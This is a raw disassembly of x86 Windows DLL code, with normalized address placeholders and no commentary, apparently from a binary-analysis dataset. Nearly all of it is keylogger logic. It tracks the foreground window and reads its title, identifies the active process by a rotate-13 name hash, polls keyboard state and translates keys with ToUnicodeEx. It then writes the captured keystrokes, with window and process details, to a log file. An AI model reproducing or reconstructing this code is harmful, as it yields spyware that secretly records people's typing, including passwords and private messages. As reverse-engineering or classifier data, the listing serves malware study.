mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1000de30
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ccab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
mov [ ebp - 0x38 ] ebx
push 0x2
mov [ ebp - 0x3c ] edi
mov [ edi ] r--data
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
call sub_10019ba5
push r--data
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] r--data
call sub_1001a898
int3
mov [ esi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ esi ]
mov [ edx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea esi [ edi + 0x48 ]
push 0x8
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ edi + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ edi ] r--data
call sub_10009230
lea esi [ edi + 0x30 ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x30 ] ebx
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x54 ] r--data
call sub_1001a898
mov [ esi ] eax
mov [ eax + 0x4 ] ebx
xor ecx ecx
mov [ eax ] ecx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea ecx [ edi + 0x60 ]
mov [ ebp - 0x4 ] 0x2
call sub_100199e5
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x1c ] ebx
call sub_10008ee0
mov ecx [ rw-data ]
push 0x18
mov [ edi + 0x64 ] eax
mov [ edi + 0x20 ] ecx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x30 ] ebx
push 0xc
push rw-data
push 0x3e
push rw-data
mov ecx eax
call sub_10012710
mov [ ebp - 0x30 ] eax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
push edx
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] 0x1
jb r-xdata
push 0x64
mov [ ebp - 0x4 ] 0x3
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x4 ] 0x5
cmp esi ebx
je r-xdata
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov dx [ rw-data ]
mov [ edi + 0x24 ] ebx
mov [ edi + 0x2c ] ebx
mov [ ecx ] dx
mov [ edi + 0x28 ] bl
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
test [ ebp - 0x38 ] 0x1
mov [ edi + 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
je r-xdata
mov edx [ rw-data ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
mov edx [ rw-data ]
push ecx
push ebx
mov ecx esi
mov [ eax + 0xc ] edx
call sub_100187f0
jmp r-xdata
sub_1000e080
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movzx ecx [ esi ]
xor edx edx
xor eax eax
test cx cx
je r-xdata
pop esi
pop ebp
retn 0x4
movzx ecx cx
ror eax 0xd
inc edx
add eax ecx
movzx ecx [ esi + edx * 2 ]
test cx cx
jne r-xdata
sub_1000e0b0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
call sub_10019a16
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
mov [ esi + 0x2c ] ecx
cmp ecx eax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_10019a1f
pop edi
xor al al
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov edi edi
lea ecx [ esi + 0x4 ]
call sub_10019a1f
pop edi
mov al 0x1
pop esi
pop ebp
retn 0x4
mov ecx [ ecx ]
mov [ esi + 0x2c ] ecx
cmp ecx [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x2c ]
cmp [ ecx + 0x8 ] eax
je r-xdata
sub_1000e110
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ccd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ecx ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push 0x1
push eax
call sub_10006cf0
test al al
je r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_100190f4
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
test edi edi
je r-xdata
mov [ eax + edi ] 0x0
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1000e1dd
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1001a898
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_100190f4
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
sub_1000e290
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_10019ce4
add esp 0x4
sub_1000e2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cd1e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x18
mov esi ecx
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0x88 ] ebx
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x82 ] bl
mov [ ebp - 0x81 ] bl
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xd8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0xac ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_10012700
mov edi eax
jmp r-xdata
mov edx [ esi + 0x8 ]
add ecx ecx
push ecx
push eax
push edx
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
push 0xc
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x3c
push rw-data
mov ecx edi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10012c50
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
mov edx [ ebp - 0x90 ]
mov ecx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
push 0x2c
push rw-data
mov ecx edi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10012c50
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
mov edx [ ebp - 0x90 ]
mov ecx [ edx + 0x10 ]
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
mov edx [ esi + 0x10 ]
add ecx ecx
push ecx
push eax
push edx
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
push 0x30
push rw-data
mov ecx edi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10012c50
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
mov edx [ ebp - 0x90 ]
mov ecx [ edx + 0x10 ]
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
mov edx [ esi + 0xc ]
add ecx ecx
push ecx
push eax
push edx
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
push 0x44
push rw-data
mov ecx edi
call sub_10012770
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x40000000
push eax
call [ CreateFileW@IAT ]
cmp [ ebp - 0x6c ] 0x8
mov [ ebp - 0x94 ] eax
jb r-xdata
mov eax [ eax ]
push 0x7
xor edx edx
push rw-data
mov ecx edi
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
call sub_10012770
lea eax [ ebp - 0x64 ]
push eax
mov ecx edi
call sub_10012d50
mov [ ebp - 0x4 ] 0x4
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x94 ] ebx
jne r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
call [ GetForegroundWindow@IAT ]
mov ebx eax
mov [ ebp - 0xa8 ] ebx
test ebx ebx
jne r-xdata
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10019ce4
add esp 0x4
cmp ebx [ ebp - 0xd8 ]
je r-xdata
push 0x12c
call edi
jmp r-xdata
cmp [ ebp - 0xb8 ] 0x64
jae r-xdata
cmp [ ebp - 0x8c ] 0x0
je r-xdata
lea edx [ ebp - 0xd4 ]
push edx
push ebx
call [ GetWindowThreadProcessId@IAT ]
mov edi eax
mov [ ebp - 0x82 ] 0x0
cmp edi [ ebp - 0x8c ]
je r-xdata
mov edi [ Sleep@IAT ]
push 0x14
call edi
cmp [ ebp - 0xb0 ] 0x0
je r-xdata
call [ GetTickCount@IAT ]
mov [ ebp - 0xa4 ] eax
sub eax [ ebp - 0xd0 ]
cmp eax 0x1f4
jbe r-xdata
mov edx [ esi + 0x18 ]
push edx
call [ GetKeyboardState@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8c ] 0x0
je r-xdata
lea eax [ ebp - 0xe0 ]
push eax
call [ GetCursorPos@IAT ]
test eax eax
je r-xdata
xor edi edi
mov edi edi
push 0x1f4
call [ Sleep@IAT ]
mov eax [ ebp - 0x90 ]
push 0x1
push eax
push edi
call [ AttachThreadInput@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x90 ]
mov ecx [ ebp - 0x8c ]
push 0x0
push eax
push ecx
call [ AttachThreadInput@IAT ]
mov edx [ esi + 0x1c ]
push 0x100
push 0x0
push edx
call sub_1001a9b0
add esp 0xc
mov [ ebp - 0x8c ] 0x0
mov ebx [ ebp - 0xe0 ]
mov edi [ ebp - 0xdc ]
mov ecx ebx
sub ecx [ ebp - 0xcc ]
mov eax edi
sub eax [ ebp - 0xc8 ]
mov edx ecx
imul edx ecx
imul eax eax
add edx eax
mov [ ebp - 0xb8 ] edx
je r-xdata
inc edi
cmp edi 0x100
jb r-xdata
mov [ eax + edi ] dl
mov eax [ esi + 0x18 ]
test [ edi + eax ] 0x80
jne r-xdata
push 0x64
call [ Sleep@IAT ]
mov [ ebp - 0x8c ] edi
mov edi [ ebp - 0x88 ]
mov [ ebp - 0xd8 ] ebx
mov [ ebp - 0xb0 ] 0x1
test edi edi
je r-xdata
push edi
push ebx
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xc8 ] edi
call [ WindowFromPoint@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi + 0x1c ]
mov dl [ edi + ecx ]
cmp dl [ eax + edi ]
je r-xdata
jmp r-xdata
mov [ ebp - 0x83 ] 0x0
cmp edi 0x8
je r-xdata
mov eax [ ebp - 0xd4 ]
cmp eax [ ebp - 0xc4 ]
je r-xdata
cmp [ ebp - 0x81 ] 0x0
jne r-xdata
cmp edi [ ebp - 0xb4 ]
jne r-xdata
cmp edi 0x1b
je r-xdata
cmp edi 0xb
je r-xdata
push eax
push 0x0
push 0x410
mov [ ebp - 0xc4 ] eax
call [ OpenProcess@IAT ]
mov edi eax
call [ GetLastError@IAT ]
test edi edi
je r-xdata
mov edx [ esi + 0x14 ]
mov eax [ rw-data ]
mov ecx [ esi + 0x10 ]
push 0x0
push 0x0
push 0x230
push edx
add eax edi
push eax
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp - 0x94 ]
push 0x0
lea edx [ ebp - 0x98 ]
push edx
push eax
mov eax [ esi + 0x14 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov [ ebp - 0x88 ] 0x0
mov ecx [ esi + 0x14 ]
mov edx [ rw-data ]
add edx [ ebp - 0xa0 ]
push 0x0
push 0x0
push 0x230
push ecx
mov ecx [ esi + 0x8 ]
push edx
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp - 0x94 ]
push 0x0
lea edx [ ebp - 0x98 ]
push edx
push eax
mov eax [ esi + 0x14 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov [ ebp - 0x81 ] 0x1
push 0x0
push edi
call [ GetWindowThreadProcessId@IAT ]
cmp eax [ ebp - 0x8c ]
je r-xdata
mov eax [ ebp - 0xa4 ]
mov ecx eax
sub ecx [ ebp - 0xc0 ]
cmp ecx 0x1f4
jb r-xdata
cmp [ ebp - 0x88 ] 0x0
je r-xdata
cmp edi 0x20
jbe r-xdata
cmp edi 0xd
jbe r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
push 0x104
lea ecx [ edx + eax * 2 ]
push ecx
push edi
call GetProcessImageFileNameW
mov [ ebp - 0xa0 ] eax
test eax eax
je r-xdata
cmp edi [ ebp - 0xa8 ]
je r-xdata
mov [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov edi [ ebp - 0xa8 ]
mov [ ebp - 0xc0 ] eax
cmp edi [ ebp - 0xb4 ]
je r-xdata
cmp [ ebp - 0x88 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x88 ]
jmp r-xdata
cmp edi 0x2a
jbe r-xdata
cmp edi 0x2a
jb r-xdata
push edi
call [ CloseHandle@IAT ]
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
lea ecx [ edx + eax * 2 ]
push ecx
call [ PathFindFileNameW@IAT ]
push eax
mov ecx esi
call sub_1000e080
push eax
mov ecx esi
call sub_1000e0b0
cmp al 0x1
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ rw-data ]
lea edx [ ebp - 0x9c ]
push edx
push 0xa
push 0x3
lea edx [ eax + ecx * 2 ]
push edx
push 0x104
push 0xd
push edi
call [ SendMessageTimeoutW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xb4 ] edi
cmp edi 0x2
jbe r-xdata
cmp [ ebp - 0x82 ] 0x1
jne r-xdata
cmp [ ebp - 0x81 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8c ]
push ecx
call [ GetKeyboardLayout@IAT ]
mov ebx eax
push ebx
push 0x0
push edi
call [ MapVirtualKeyExW@IAT ]
test eax eax
je r-xdata
cmp edi 0x30
jb r-xdata
mov [ ebp - 0x81 ] 0x0
mov [ ebp - 0x82 ] al
cmp [ ebp - 0x9c ] 0x0
je r-xdata
call [ GetTickCount@IAT ]
mov [ ebp - 0xd0 ] eax
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x82 ] 0x0
jae r-xdata
mov edx [ esi + 0x14 ]
mov eax [ rw-data ]
mov ecx [ esi + 0x10 ]
push 0x0
push 0x0
push 0x230
push edx
add eax ebx
push eax
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp - 0x94 ]
push 0x0
lea edx [ ebp - 0x98 ]
push edx
push eax
mov eax [ esi + 0x14 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov [ ebp - 0x88 ] 0x0
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ rw-data ]
add edx [ ebp - 0xa0 ]
push 0x0
push 0x0
push 0x230
push ecx
mov ecx [ esi + 0x8 ]
push edx
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp - 0x94 ]
push 0x0
lea edx [ ebp - 0x98 ]
push edx
push eax
mov eax [ esi + 0x14 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov [ ebp - 0x81 ] 0x1
mov ecx [ esi + 0x18 ]
push ebx
push 0x0
push 0x2
lea edx [ ebp - 0xac ]
push edx
push ecx
push eax
push edi
call [ ToUnicodeEx@IAT ]
cmp eax 0x1
jne r-xdata
mov ebx [ rw-data ]
mov edx [ esi + 0xc ]
lea eax [ edx + ebx * 2 ]
lea ecx [ eax + 0x2 ]
mov [ ebp - 0xa4 ] ecx
lea esp [ esp ]
mov ecx [ ebp - 0x54 ]
push 0x0
lea edx [ ebp - 0x98 ]
push edx
mov edx [ ebp - 0x94 ]
push ecx
push eax
push edx
call [ WriteFile@IAT ]
lea eax [ ebp - 0x64 ]
mov eax [ ebp - 0xac ]
mov ebx [ ebp - 0x88 ]
cmp ax 0x1f
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0xa4 ]
mov ecx [ ebp - 0x9c ]
sar eax 0x1
cmp ecx eax
jne r-xdata
cmp [ ebp - 0xac ] 0x8
jne r-xdata
mov edx [ rw-data ]
mov ecx [ esi + 0x10 ]
add edx ebx
mov [ ecx + edx * 2 ] ax
movzx edx [ esi ]
inc ebx
mov [ ebp - 0x88 ] ebx
cmp ebx edx
jne r-xdata
lea eax [ ebx + ecx ]
xor ecx ecx
mov [ edx + eax * 2 + 0x2 ] cx
cmp edi [ ebp - 0xa8 ]
jne r-xdata
cmp [ ebp - 0x83 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi + 0x10 ]
add eax ebx
mov edx 0x5d
mov [ ecx + eax * 2 ] dx
movzx eax [ esi ]
inc ebx
mov [ ebp - 0x88 ] ebx
cmp ebx eax
je r-xdata
mov [ ebp - 0x83 ] 0x1
cmp [ ebp - 0x81 ] 0x0
jne r-xdata
mov edx [ esi + 0xc ]
lea edx [ edx + ebx * 2 ]
push edx
mov ecx esi
call sub_1000e080
cmp eax [ ebp - 0xbc ]
je r-xdata
mov ecx [ esi + 0x14 ]
add ebx [ ebp - 0x9c ]
mov eax [ esi + 0xc ]
push 0x0
push 0x0
push 0x230
push ecx
push ebx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0x98 ]
push ecx
push eax
mov eax [ ebp - 0x94 ]
push edx
push eax
call [ WriteFile@IAT ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ rw-data ]
add ecx [ ebp - 0xa0 ]
push 0x0
push 0x0
push 0x230
push eax
mov eax [ esi + 0x8 ]
push ecx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0x98 ]
push ecx
push eax
mov eax [ ebp - 0x94 ]
push edx
push eax
call [ WriteFile@IAT ]
mov ebx [ rw-data ]
mov [ ebp - 0x81 ] 0x1
mov [ ebp - 0xbc ] eax
sub_1000ed00
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
lea ecx [ esi + 0x4 ]
mov [ esi ] edx
push 0xffffffff
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
push eax
mov [ ebp - 0x4 ] eax
mov [ ecx ] al
mov eax [ ebp + 0x10 ]
push eax
call sub_10007380
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_1000ed40
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov esi [ eax ]
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov [ edi + 0x4 ] 0x0
cmp esi [ edi ]
je r-xdata
pop edi
pop esi
retn
push ebx
jmp r-xdata
cmp [ esi + 0x20 ] 0x10
mov ebx [ esi ]
jb r-xdata
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] 0x0
call sub_10019ce4
add esp 0x4
mov esi ebx
cmp ebx [ edi ]
jne r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
pop ebx
sub_1000eda0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
lea ecx [ esi + 0x4 ]
mov [ esi ] edx
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ ecx ] al
mov eax [ ebp + 0x10 ]
push eax
call sub_100076f0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_1000ede0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ edx ]
push ebx
push esi
push edi
mov esi ecx
xor ecx ecx
xor edi edi
test ax ax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_10019a16
cmp [ esi + 0x24 ] 0x0
je r-xdata
movzx eax ax
ror edi 0xd
inc ecx
add edi eax
movzx eax [ edx + ecx * 2 ]
test ax ax
jne r-xdata
pop edi
pop esi
xor al al
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
mov [ esi + 0x2c ] ecx
cmp ecx eax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_10019a1f
mov ecx [ esi + 0x2c ]
cmp [ ecx + 0x8 ] edi
je r-xdata
mov edi ecx
cmp edi [ esi + 0x20 ]
je r-xdata
mov eax [ ecx ]
mov [ esi + 0x2c ] eax
cmp eax [ esi + 0x20 ]
jne r-xdata
lea ecx [ esi + 0x4 ]
call sub_10019a1f
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov edx [ edi + 0x4 ]
mov eax [ edi ]
mov [ edx ] eax
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
cmp [ edi + 0x20 ] 0x10
jb r-xdata
mov [ edi + 0x20 ] 0xf
mov [ edi + 0x1c ] 0x0
push edi
mov [ edi + 0xc ] 0x0
call sub_10019ce4
add esp 0x4
